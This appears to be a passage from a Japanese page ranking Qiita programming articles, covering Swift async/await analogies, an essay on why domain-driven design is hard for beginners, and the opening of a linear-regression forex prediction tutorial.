  <span class="k">do</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">try</span> <span class="n">bar</span><span class="p">()</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
    <span class="c1">// エラー処理</span>
    <span class="k">return</span> <span class="n">Bar</span><span class="p">(...)</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p><code>async/await</code> でも同様に <code>await</code> を含む関数は <code>async</code> でなければなりません。では、 <code>do/xxx</code> を考えるとどのようなものである必要があるでしょう？</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// do/xxx なし</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `async` 必須</span>
  <span class="k">return</span> <span class="k">try</span> <span class="n">bar</span><span class="p">()</span>
<span class="p">}</span>

<span class="c1">// do/xxx あり</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `async` でなくて良い</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
  <span class="p">}</span> <span class="n">xxx</span>
<span class="p">}</span>
</pre></div></div>

<p>このような挙動を実現する <code>xxx</code> は何を意味するでしょうか？ <code>bar()</code> は非同期なのに <code>foo()</code> は（ <code>async</code> でないので）同期的に <code>return</code> された <code>Bar</code> を返せています。</p>

<p>これを実現するには、 <code>xxx</code> によって非同期処理が同期化されなければなりません。つまり、 <code>xxx</code> は <code>bar()</code> の非同期処理が終わって結果が得られるまで待つという意味になるはずです。</p>

<p>「待つ」なので <code>xxx</code> に <code>wait</code> という単語を当てれば↓のようになります（他にも、 <code>sync</code> とか <code>block</code> とかの方がいいかもしれませんが）。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// do/wait なし</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `async` 必須 → 非同期</span>
  <span class="k">return</span> <span class="k">try</span> <span class="n">bar</span><span class="p">()</span>
<span class="p">}</span>

<span class="c1">// do/wait あり</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `async` でなくて良い → 同期</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
  <span class="p">}</span> <span class="n">wait</span> <span class="c1">// `bar()` が完了するまでここで待つ</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="throws--try--try--async--await--" class="fragment"></span><a href="#throws--try--try--async--await--"><i class="fa fa-link"></i></a><code>throws</code> : <code>try</code> : <code>try!</code> = <code>async</code> : <code>await</code> : ?</h3>

<p>次は <code>try!</code> に当たるものを考えてみましょう。</p>

<p><code>throws</code> が <code>Result</code> を返すことに対応することを考えると、 <code>try!</code> は強制的に <code>Result</code> を unwrap するようなものです。 <code>Optional</code> の <code>!</code> に近い操作です。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ! なし</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="kr">throws</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `throws` 必須</span>
  <span class="k">return</span> <span class="k">try</span> <span class="n">bar</span><span class="p">()</span>
<span class="p">}</span>

<span class="c1">// ! あり</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `throws` でなくて良い</span>
  <span class="k">return</span> <span class="k">try</span><span class="p">!</span> <span class="n">bar</span><span class="p">()</span>
<span class="p">}</span>
</pre></div></div>

<p>では、 <code>Promise</code> を unwrap する操作とか何でしょうか。それはやはり値が手に入るまで待つことを意味するのではないでしょうか。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ! なし</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="n">async</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `async` 必須</span>
  <span class="k">return</span> <span class="n">await</span> <span class="n">bar</span><span class="p">()</span>
<span class="p">}</span>

<span class="c1">// ! あり</span>
<span class="kd">func</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Bar</span> <span class="p">{</span> <span class="c1">// `async` でなくて良い</span>
  <span class="k">return</span> <span class="n">await</span><span class="p">!</span> <span class="n">bar</span><span class="p">()</span> <span class="c1">// `bar()` が完了するまでここで待つ</span>
<span class="p">}</span>
</pre></div></div>

<p><code>try!</code> が失敗時にクラッシュするのと同じように、処理が完了してなかったらクラッシュと考えることもできるかもしれません。しかし、 <code>try!</code> がクラッシュするのは <code>Result</code> でいう <code>.failure</code> 由来の性質だと思うので、僕はクラッシュではなく同期的に待つ方が自然だと思います。</p>

<p>ただし、 <code>await!</code> という表記は適切だとは思いません。 Swift では <code>!</code> が Forced Unwrapping の他に、 <code>try!</code>, <code>as!</code> など一貫して「失敗しうる処理の失敗を無視する（失敗したらハンドリングせずクラッシュさせる）」という意味で使われているからです。あくまで、 <code>try!</code> 相当の強制的に <code>Promise</code> を unwrap するような処理を考えると同期になるんじゃないかという話です。</p>

<h3>
<span id="throws--try--rethrows--async--await--" class="fragment"></span><a href="#throws--try--rethrows--async--await--"><i class="fa fa-link"></i></a><code>throws</code> : <code>try</code> : <code>rethrows</code> = <code>async</code> : <code>await</code> : ?</h3>

<p>次は <code>rethrows</code> です。これについては <a href="https://gist.github.com/lattner/429b9070918248274f25b714dcfc7619#rethrows-could-be-generalized-to-support-potentially-async-operations" rel="nofollow noopener" target="_blank">Proposal でも簡単に触れられています</a>。</p>

<p><code>rethrows</code> が付与されている高階関数は、渡されたクロージャが <code>throws</code> だった場合に自分自身も <code>throws</code> になります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">array</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="n">foo</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>         <span class="c1">// `map` は `throws` でない</span>
<span class="k">try</span> <span class="n">array</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="k">try</span> <span class="n">bar</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span> <span class="c1">// `map` も `throws` になる</span>

</pre></div></div>

<p>同じように、渡されたクロージャが <code>async</code> だった場合に自身も <code>async</code> になる <code>reasync</code> のようなものも考えられます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">array</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="n">foo</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span>             <span class="c1">// `map` は `async` でない</span>
<span class="n">await</span> <span class="n">array</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="n">await</span> <span class="n">bar</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">}</span> <span class="c1">// `map` も `async` になる</span>
</pre></div></div>

<h2>
<span id="generator" class="fragment"></span><a href="#generator"><i class="fa fa-link"></i></a>Generator</h2>

<p>ここまで非同期と言い続けてきましたが、 <code>async/await</code> はコルーチンを実現するための仕組みであって非同期に限ったものではありません。</p>

<p>非同期に限らない例として、いくつかの言語にある Generator と呼ばれる仕組みを紹介します。たとえば、↓は Python の例です。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># Python</span>
<span class="k">def</span> <span class="nf">foo</span><span class="p">():</span>
  <span class="k">yield</span> <span class="mi">2</span>
  <span class="k">yield</span> <span class="mi">3</span>
  <span class="k">yield</span> <span class="mi">5</span>

<span class="n">g</span> <span class="o">=</span> <span class="n">foo</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">g</span><span class="p">))</span>  <span class="c1"># 2</span>
<span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">g</span><span class="p">))</span>  <span class="c1"># 3</span>
<span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">g</span><span class="p">))</span>  <span class="c1"># 5</span>
</pre></div></div>

<p>この <code>Generator</code> は、専用の言語機能を持たなくても <code>async/await</code> で実現することができます。たとえば、 Swift に <code>async/await</code> があったとして、↓のような <code>Generator</code> 型を作ることができます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">g</span> <span class="p">=</span> <span class="n">Generator</span> <span class="p">{</span> <span class="n">yield</span> <span class="k">in</span>
  <span class="n">await</span> <span class="n">yield</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
  <span class="n">await</span> <span class="n">yield</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
  <span class="n">await</span> <span class="n">yield</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="p">}</span>

<span class="bp">print</span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="n">next</span><span class="p">()</span><span class="o">!</span><span class="p">)</span> <span class="c1">// 2</span>
<span class="bp">print</span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="n">next</span><span class="p">()</span><span class="o">!</span><span class="p">)</span> <span class="c1">// 3</span>
<span class="bp">print</span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="n">next</span><span class="p">()</span><span class="o">!</span><span class="p">)</span> <span class="c1">// 5</span>
</pre></div></div>

<p><code>Generator</code> の実装例は<a href="https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20170821/039150.html" rel="nofollow noopener" target="_blank">ここ</a>にあります。</p>

<p>別々の言語機能として持つのではなく、 <code>async/await</code> だけで両方実現できるのは本質を表していて美しいように思います。</p>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<ul>
<li>
<code>throws</code> : <code>try</code> : <code>Result</code> = <code>async</code> : <code>await</code> : <code>Promise</code>
</li>
<li>美しいは正義</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">92位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>97</kbd>
		<a target="_blank" href="https://qiita.com/little_hand_s/items/c612b061d2b2b1eb8c1a">なぜDDD初心者はググり出してすぐに心がくじけてしまうのか</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-24<br />01:18:56</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/30489.html">little_hand_s</a>(16件の記事)<br />(株式会社ビズリーチ 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/30489/profile-images/1473685506">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[DDD]</b> <b>[ドメイン駆動設計]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>DDD連載記事<br>
* <a href="http://little-hands.hatenablog.com/entry/2017/09/24/005903" rel="nofollow noopener" target="_blank">なぜDDD初心者はググリ出してすぐに心がくじけてしまうのか</a><br>
* <a href="http://little-hands.hatenablog.com/entry/2017/09/27/014403" rel="nofollow noopener" target="_blank">ドメイン駆動設計の定義についてEric Evansはなんと言っているのか</a><br>
* <a href="http://little-hands.hatenablog.com/entry/2017/10/04/201201" rel="nofollow noopener" target="_blank">モデルでドメイン知識を表現するとは何か</a><br>
* <a href="http://little-hands.hatenablog.com/entry/2017/10/04/231743" rel="nofollow noopener" target="_blank">ドメイン駆動設計で実装を始めるのに一番とっつきやすいアーキテクチャは何か</a><br>
* <a href="http://little-hands.hatenablog.com/entry/2017/10/11/075634" rel="nofollow noopener" target="_blank">ドメイン駆動 + オニオンアーキテクチャ概略</a></p>

<h2>
<span id="背景" class="fragment"></span><a href="#%E8%83%8C%E6%99%AF"><i class="fa fa-link"></i></a>背景</h2>

<p>直近のプロジェクトでDDDの思想に則ったアーキテクチャで一つリリースまで漕ぎ付けまして、そこに至るまで色々と調べたり試行錯誤をしながら学んだことを書いていこうと思います。</p>

<p>一番にですね、大体のDDDに興味を持った人がいうのが</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>「単語が難しいばかりで結局イメージが湧かない」

「ドメイン駆動の本を読もうとして速攻で心が折れた」

</pre></div></div>

<p>ということなんですよね。</p>

<p>DDDは思想としてすごく面白く、とても実用性なものなのに、なんでこんなにわかりづらいのか、ハードルが高いのか！！</p>

<p>という点について、私なりの解釈を述べたいと思います。</p>

<h2>
<span id="心をくじく要因" class="fragment"></span><a href="#%E5%BF%83%E3%82%92%E3%81%8F%E3%81%98%E3%81%8F%E8%A6%81%E5%9B%A0"><i class="fa fa-link"></i></a>心をくじく要因</h2>

<h3>
<span id="eric-evans本は説明が圧倒的に下手笑" class="fragment"></span><a href="#eric-evans%E6%9C%AC%E3%81%AF%E8%AA%AC%E6%98%8E%E3%81%8C%E5%9C%A7%E5%80%92%E7%9A%84%E3%81%AB%E4%B8%8B%E6%89%8B%E7%AC%91"><i class="fa fa-link"></i></a>Eric Evans本は説明が圧倒的に下手。笑</h3>

<p>ドメイン駆動設計といえば原著がこの本(以下、原典)なのですが、</p>

<p><a href="https://www.amazon.co.jp/gp/product/4798121967/ref=as_li_tl?ie=UTF8&amp;camp=247&amp;creative=1211&amp;creativeASIN=4798121967&amp;linkCode=as2&amp;tag=majackyy-22&amp;linkId=fcff16d1f17171252e6e345455e9e396" rel="nofollow noopener" target="_blank">エリック・エヴァンスのドメイン駆動設計</a><a href="https://camo.qiitausercontent.com/52f49bbe2fa16872ddf759ce29abe4fecfea498a/68747470733a2f2f69722d6a702e616d617a6f6e2d616473797374656d2e636f6d2f652f69723f743d6d616a61636b79792d3232266c3d616d32266f3d3926613d34373938313231393637" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/52f49bbe2fa16872ddf759ce29abe4fecfea498a/68747470733a2f2f69722d6a702e616d617a6f6e2d616473797374656d2e636f6d2f652f69723f743d6d616a61636b79792d3232266c3d616d32266f3d3926613d34373938313231393637" width="1" height="1" alt="" data-canonical-src="//ir-jp.amazon-adsystem.com/e/ir?t=majackyy-22&amp;l=am2&amp;o=9&amp;a=4798121967"></a></p>

<p>この本は本当〜〜〜にわかりづらいです。重要なことは確かに書いてあるんですが、構成がかなりしんどくてまとまりがないのです。一通り実装してからも結局この結論になるので、あの本でわからないのは仕方ないです。笑</p>

<p>まず書籍は実践DDD(以下、IDDD)から入るのが良いと思います。</p>

<p><a href="https://www.amazon.co.jp/gp/product/B00UX9VJGW/ref=as_li_tl?ie=UTF8&amp;camp=247&amp;creative=1211&amp;creativeASIN=B00UX9VJGW&amp;linkCode=as2&amp;tag=majackyy-22&amp;linkId=a121f28c6f7cbe6c3477d79a5fed7405" rel="nofollow noopener" target="_blank">実践ドメイン駆動設計</a><a href="https://camo.qiitausercontent.com/834dfc592e252ff0874c6ea2fa9761ab5942ade0/68747470733a2f2f69722d6a702e616d617a6f6e2d616473797374656d2e636f6d2f652f69723f743d6d616a61636b79792d3232266c3d616d32266f3d3926613d423030555839564a4757" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/834dfc592e252ff0874c6ea2fa9761ab5942ade0/68747470733a2f2f69722d6a702e616d617a6f6e2d616473797374656d2e636f6d2f652f69723f743d6d616a61636b79792d3232266c3d616d32266f3d3926613d423030555839564a4757" width="1" height="1" alt="" data-canonical-src="//ir-jp.amazon-adsystem.com/e/ir?t=majackyy-22&amp;l=am2&amp;o=9&amp;a=B00UX9VJGW"></a></p>

<p>ここである程度イメージをもたせてから、興味があったら原点に当たるというのが良いでしょう。</p>

<h3>
<span id="dddは対象領域が広いがそれが理解されずそれぞれ局所的な説明がされていることが多い" class="fragment"></span><a href="#ddd%E3%81%AF%E5%AF%BE%E8%B1%A1%E9%A0%98%E5%9F%9F%E3%81%8C%E5%BA%83%E3%81%84%E3%81%8C%E3%81%9D%E3%82%8C%E3%81%8C%E7%90%86%E8%A7%A3%E3%81%95%E3%82%8C%E3%81%9A%E3%81%9D%E3%82%8C%E3%81%9E%E3%82%8C%E5%B1%80%E6%89%80%E7%9A%84%E3%81%AA%E8%AA%AC%E6%98%8E%E3%81%8C%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8%E3%81%8C%E5%A4%9A%E3%81%84"><i class="fa fa-link"></i></a>DDDは対象領域が広いが、それが理解されずそれぞれ局所的な説明がされていることが多い</h3>

<p>DDDの領域は大きく分けて3つに分けられます。</p>

<ul>
<li>開発思想：

<ul>
<li>システムの複雑性に取り組むために、業務の専門家と技術の専門家で言語・モデルの認識を合わせ、継続的に進化させていこう、という考え方</li>
</ul>
</li>
<li>戦略的設計：

<ul>
<li>ドメインモデリングの前提を揃えるための、モデリング対象を定義する原則と手法(コアドメイン/サブドメイン、境界付けられたコンテキスト、コンテキストマップ等)</li>
</ul>
</li>
<li>戦術的設計

<ul>
<li>モデルを具体的に表現するためのパターン(エンティティ、レポジトリ、レイヤードアーキテクチャ等)</li>
</ul>
</li>
</ul>

<p>この全体像が整理されないまま、メリットやHowの話になってしまうと、全体像が見えないので何の話をしているのか混乱してしまうのです。</p>

<p>強引に例を挙げるならスクラムの見積もり手法とGoFデザインパターンのいくつかを並べて同時に「開発の効率化とは」と論じるようなものです。それぞれに目的があり、関係性があり、それが繋がって本当にやりたいことができるわけです。</p>

<h3>
<span id="アーキテクチャの話のウェイトが軽い" class="fragment"></span><a href="#%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%AE%E8%A9%B1%E3%81%AE%E3%82%A6%E3%82%A7%E3%82%A4%E3%83%88%E3%81%8C%E8%BB%BD%E3%81%84"><i class="fa fa-link"></i></a>アーキテクチャの話のウェイトが軽い</h3>

<p>戦術設計の話で、レイヤー化アーキテクチャについては 「ドメイン層を設けてドメインロジックはそこに閉じ込めましょう」ぐらいで終わっていきなりエンティティやレポジトリパターンの話になってしまう。</p>

<p>これも罠だと思っています。なぜなら、</p>

<p><b>DDD戦術的設計の最大のメリット、同時に一番頭をひねるところはとにかくアーキテクチャにある</b></p>

<p>と言っても過言ではないと思うからです。</p>

<p>まず、DDDの推奨するアーキテクチャを採用することによっていかにメリットがあるか。ここについてきちんと時間を割き、その後のモチベーションを高めることがまずは重要だと思っています。<b>エンティティ、レポジトリというパターンは、あくまでレイヤーを綺麗に分ける上でのHowでしかない</b>のです。ここのウェイトの認識を間違えないようにすることが重要です。</p>

<p>しかし！ここからはより具体的な問題が出てきます。。</p>

<h3>
<span id="アーキテクチャのお手本が一つに統合されていない" class="fragment"></span><a href="#%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%AE%E3%81%8A%E6%89%8B%E6%9C%AC%E3%81%8C%E4%B8%80%E3%81%A4%E3%81%AB%E7%B5%B1%E5%90%88%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>アーキテクチャのお手本が一つに統合されていない</h3>

<p>実は、原典でお手本とされているレイヤー化アーキテクチャと、IDDDでお手本とされているアーキテクチャが違うのです。</p>

<p>これは、IDDDでは原典から10年のときを経て洗練されたアーキテクチャになっているということなのですが、これはつまりエンティティなどのデザインパターンは原典でかなり完成されていたのに対して、レイヤー化アーキテクチャに関しては実はある意味未成熟なものであったということ。</p>

<p>そしてそれによりネット上の文献で紹介されるアーキテクチャが様々なものとなっているのです。IDDDではヘキサゴナルアーキテクチャというものが掲げられていましたが、それを進化させたオニオンアーキテクチャ、クリーンアーキテクチャなどの有名な亜種が存在します。また日本の著名なDDD推進されている方のスライドを見ると、ヘキサゴナルとは思想の異なるアーキテクチャを提案しています。</p>

<p>これが実装に着手する際に非常に大きな混乱を呼ぶのです。文脈の理解、採用するアーキテクチャの選定に時間を取られることでしょう。</p>

<h2>
<span id="今後のお話" class="fragment"></span><a href="#%E4%BB%8A%E5%BE%8C%E3%81%AE%E3%81%8A%E8%A9%B1"><i class="fa fa-link"></i></a>今後のお話</h2>

<p>以上、ひとまず導入して思うところをつらつらと書かせていただきました。</p>

<p>ひとまず上記のような分かりづらさがあるよね、というのを整理した上で、私なりに分かりやすいと思う説明の記事を書いていこうと思います。ご興味ありましたら、どうぞおつきあいくださいませ。</p>

<h2>
<span id="後続記事" class="fragment"></span><a href="#%E5%BE%8C%E7%B6%9A%E8%A8%98%E4%BA%8B"><i class="fa fa-link"></i></a>後続記事</h2>

<p>よろしければどうぞ！<br>
<a href="http://little-hands.hatenablog.com/entry/2017/09/27/014403" rel="nofollow noopener" target="_blank">DDDの定義についてEric Evansはなんと言っているのか</a><br>
<a href="http://little-hands.hatenablog.com/entry/2017/10/04/201201" rel="nofollow noopener" target="_blank">【DDD】モデルでドメイン知識を表現するとは何か</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">93位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>95</kbd>
		<a target="_blank" href="https://qiita.com/sugulu/items/5c1b03cd445f27fd3e28">のび太と学ぶ「機械学習」【第3話】完成：FX予測プログラム（線形回帰版）</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-13<br />05:32:04</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/191401.html">sugulu</a>(11件の記事)<br />(都内IT企業 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/191401/profile-images/1509357969">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[初心者]</b> <b>[機械学習]</b> <b>[DeepLearning]</b> <b>[FX]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>本シリーズでは、「FXの予測プログラム」を作りながら、機械学習・ディープラーニングを解説します。<br>
（注）のび太くんは有名漫画のキャラとは一切関係ありません。</p>

<p>この物語は、大学生のび太くんが、家庭教師のすぐるさんから機械学習を学び、将来D-mind社を起業して、汎用人工知能搭載型ロボットを誕生させるまでの記録です。</p>

<h1>
<span id="これまでのお話" class="fragment"></span><a href="#%E3%81%93%E3%82%8C%E3%81%BE%E3%81%A7%E3%81%AE%E3%81%8A%E8%A9%B1"><i class="fa fa-link"></i></a>これまでのお話</h1>

<p>のび太くんはiPhone Xを買うために、FX予測プログラムを作成しようと、すぐるさんから機械学習を学び始めました。</p>

<p><a href="https://qiita.com/sugulu/items/45e3cfaa78e5f13d9389" id="reference-923f60d3e677bf0e11f8">第1話：のび太、if文でFXを予想する</a><br>
<a href="https://qiita.com/sugulu/items/b6f891e060beab94b99b" id="reference-6404199d342bcae048f8">第2話：のび太、線形回帰を学ぶ</a></p>

<p>今回は、前話で学習した線形回帰を利用して、ついにのび太くんのFX予想プログラムが完成します。</p>

<p>（注）本ページを参考にして生じた損益については責任を持てませんので、あしからず。</p>

<h1>
<span id="第3話のび太完成fx予測プログラム線形回帰版" class="fragment"></span><a href="#%E7%AC%AC3%E8%A9%B1%E3%81%AE%E3%81%B3%E5%A4%AA%E5%AE%8C%E6%88%90fx%E4%BA%88%E6%B8%AC%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E7%B7%9A%E5%BD%A2%E5%9B%9E%E5%B8%B0%E7%89%88"><i class="fa fa-link"></i></a>第3話：のび太、完成：FX予測プログラム（線形回帰版）</h1>

<p>さて、のび太くん、本日は「線形回帰」を利用したFX予測プログラムを作成しようか。</p>

<p>今日は突然本題から入るんだね。<br>
よしやるぞ！</p>

<p>ところで、線形回帰は覚えているかい？</p>

<p>もちろんさ。本を買って、復習もしたよ。<br>
学習データの$Y_{train}$と$X_{train}$の間にある線形モデル</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>y_p(t)=\mathbf{w}^T\mathbf{x}(t)+b
</pre></div></div>

<p>を求めて、その後テストデータで予測具合を確かめる。<br>
この線形モデルの係数、$\mathbf{w}=w_0～w_{N}$と$b$は、学習データの「予測の2乗誤差の和」</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>E(\mathbf{w}, b)=\sum_{t=0}^{M}\left [ {y_{train}(t)-y_p(t)} \right ]^2=\sum_{t=0}^{M}\left [ {y_{train}(t)-\left \{\mathbf{w}^T\mathbf{x}(t)+b  \right \}} \right ]^2
</pre></div></div>

<p>に対して、$E$が最小値となる値を、$\mathbf{w}$と$b$で$E(\mathbf{w}, b)$を偏微分して、少しずつ更新して求める。<br>
これで合っている？</p>

<p>すごいな、のび太くん。正解だよ。<br>
補足すると、実際の線形回帰は勾配降下法ではなく、一度の計算で$\mathbf{w}$と$b$を求めているけど、やりたいことは一緒だよ。<br>
あと前回言い忘れたけど、$Y$を被説明変数や目的変数と呼び、$X$を説明変数と呼ぶよ。</p>

<p>やった！じゃあ、今日は早速FXのデータでやろうよ！<br>
ツネ夫がiPhone Xをもう持っていて、自慢してくるんだよ・・・</p>

<p>よし、少しずつコードを作りながら、説明していこう。</p>

<h2>
<span id="実装その1" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85%E3%81%9D%E3%81%AE1"><i class="fa fa-link"></i></a>実装その1</h2>

<p>まず作りたいプログラムを整理しよう。</p>

<p>2007年～2016年のドル円の日足データを学習データとして使用し、<br>
翌日のドル円の終値が、当日の終値に対して、何円高いか（もしくは安いか）を予測するプログラムを作成するよ。</p>

<p>入力データには過去25日分のデータを使用する。</p>

<p>うん、25日分でだいたい1ヶ月のデータになるからだよね。</p>

<p>そうだね。<br>
このような、入力データから数値を予測する機械学習を「回帰」と呼ぶよ。</p>

<p>さあ、早速作っていこう。<br>
今回のコードは全部僕のGitHubにおいて置くね。<br>
<a href="https://github.com/Nobita-FX/Nobita-FX/blob/master/program/NobitaFX_3_linear_regression_1.ipynb" rel="nofollow noopener" target="_blank">本記事の掲載コードはこちら</a></p>

<p>最初はいつものおまじないゾーンだ。<br>
って言っても、これから使うライブラリを宣言しているだけだよ。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># import関連</span>
<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
<span class="kn">import</span> <span class="nn">pandas</span> <span class="kn">as</span> <span class="nn">pd</span>
<span class="kn">import</span> <span class="nn">matplotlib</span>
<span class="kn">import</span> <span class="nn">matplotlib.pylab</span> <span class="kn">as</span> <span class="nn">plt</span>
<span class="kn">import</span> <span class="nn">seaborn</span> <span class="kn">as</span> <span class="nn">sns</span>

<span class="kn">import</span> <span class="nn">warnings</span>
<span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s1">'ignore'</span><span class="p">)</span> <span class="c1"># 実行上問題ない注意は非表示にする</span>

<span class="o">%</span><span class="n">matplotlib</span> <span class="n">inline</span>
</pre></div></div>

<p>次に、ドル円の為替データを読み込むよ。<br>
フォルダの場所はのび太くんが為替データを置いた場所を指定してね。<br>
為替データは、GitHubに置いているよ。<br>
<a href="https://github.com/Nobita-FX/Nobita-FX/tree/master/data" rel="nofollow noopener" target="_blank">データはこちら</a></p>

<p>※為替データは、フリーでログイン不要のデータサイトStooqから取得しました。<br>
<a href="https://stooq.com/q/d/?s=usdjpy&amp;c=0" rel="nofollow noopener" target="_blank">Stooq</a></p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># dataフォルダの場所を各自指定してください</span>
<span class="n">data_dir</span> <span class="o">=</span> <span class="s2">"./"</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="n">data_dir</span> <span class="o">+</span> <span class="s2">"USDJPY_1997_2017.csv"</span><span class="p">)</span> <span class="c1"># FXデータの読み込み（データは同じリポジトリのdataフォルダに入っています）</span>
<span class="n">data</span><span class="o">.</span><span class="n">head</span><span class="p">()</span> <span class="c1"># データの概要を見てみます</span>
</pre></div></div>

